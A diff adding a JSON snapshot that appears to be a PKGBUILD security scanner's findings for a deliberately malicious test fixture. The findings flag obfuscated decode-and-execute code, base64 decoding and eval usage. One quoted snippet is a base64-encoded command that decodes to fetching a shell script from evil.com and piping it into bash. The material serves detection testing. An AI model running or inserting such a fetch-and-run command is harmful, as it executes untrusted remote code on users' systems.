@@ -1,0 +1,99 @@
+{
+  "package_name": "malicious-obfuscated",
+  "package_version": "1.0.0-1",
+  "findings": [
+    {
+      "id": "DEEP-001",
+      "severity": "critical",
+      "category": "obfuscation",
+      "title": "Decode-and-execute flow",
+      "description": "The file both decodes/decompresses data and dynamically executes shell input. Together these form a decode->execute payload, even when split across lines.",
+      "location": {
+        "file": "tests/fixtures/malicious/obfuscated/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Decode the payload manually and review it. Legitimate builds do not decode and then execute generated shell code.",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "multiline": true
+      }
+    },
+    {
+      "id": "OBF-001",
+      "severity": "high",
+      "category": "obfuscation",
+      "title": "Base64 decoding",
+      "description": "Base64 decoding may hide malicious payloads",
+      "location": {
+        "file": "tests/fixtures/malicious/obfuscated/PKGBUILD",
+        "line": 14,
+        "column": 67,
+        "snippet": "    echo \"Y3VybCBodHRwczovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaA==\" | base64 -d | sh"
+      },
+      "recommendation": "Decode and review the base64 content manually",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "matched_text": "base64 -d"
+      }
+    },
+    {
+      "id": "OBF-001",
+      "severity": "high",
+      "category": "obfuscation",
+      "title": "Base64 decoding",
+      "description": "Base64 decoding may hide malicious payloads",
+      "location": {
+        "file": "tests/fixtures/malicious/obfuscated/PKGBUILD",
+        "line": 14,
+        "column": 67,
+        "snippet": "    echo \"Y3VybCBodHRwczovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaA==\" | base64 -d | sh"
+      },
+      "recommendation": "Decode and review the base64 content manually",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "matched_text": "base64 -d"
+      }
+    },
+    {
+      "id": "OBF-002",
+      "severity": "high",
+      "category": "command_injection",
+      "title": "Eval usage",
+      "description": "Eval can execute obfuscated malicious code",
+      "location": {
+        "file": "tests/fixtures/malicious/obfuscated/PKGBUILD",
+        "line": 17,
+        "column": 5,
+        "snippet": "    eval \"$MALICIOUS_CODE\""
+      },
+      "recommendation": "Avoid eval; use direct commands instead",
+      "cwe_id": "CWE-95",
+      "metadata": {
+        "matched_text": "eval "
+      }
+    },
+    {
+      "id": "SRC-005",
+      "severity": "medium",
+      "category": "configuration",
+      "title": "No sources with build function",
+      "description": "Package has build() function but no source array",
+      "location": {
+        "file": "tests/fixtures/malicious/obfuscated/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Verify this is intentional; build() usually needs sources",
+      "cwe_id": null,
+      "metadata": {}
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/obfuscated/PKGBUILD"
+  ],
+  "timestamp": "2026-06-15T13:48:49.853682272Z",
+  "scan_duration_ms": 5
+}
